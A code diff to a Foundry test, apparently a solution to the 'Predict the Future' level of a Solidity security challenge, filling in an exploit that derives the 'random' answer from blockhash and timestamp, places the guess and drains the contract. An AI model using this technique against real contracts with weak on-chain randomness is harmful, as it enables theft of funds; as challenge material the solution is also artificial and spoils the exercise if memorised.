@@ -16,12 +16,28 @@ contract PredictTheFutureTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        console.log("testExploitLevel block timestamp: ", block.timestamp);
+        uint256 answer = uint256(
+            keccak256(
+                abi.encodePacked(
+                    blockhash(vm.getBlockNumber() - 1),
+                    block.timestamp
+                )
+            )
+        ) % 10;
+        console.log("answer: ", answer);
+        // vm.prank(address(0));
+        instance.setGuess{value: 0.01 ether}(uint8(answer));
+        vm.roll(vm.getBlockNumber() + 2);
+        instance.solution();
+        // vm.stopPrank();
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
-        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
+        assertTrue(
+            address(instance).balance == 0,
+            "Solution is not solving the level"
+        );
     }
 }
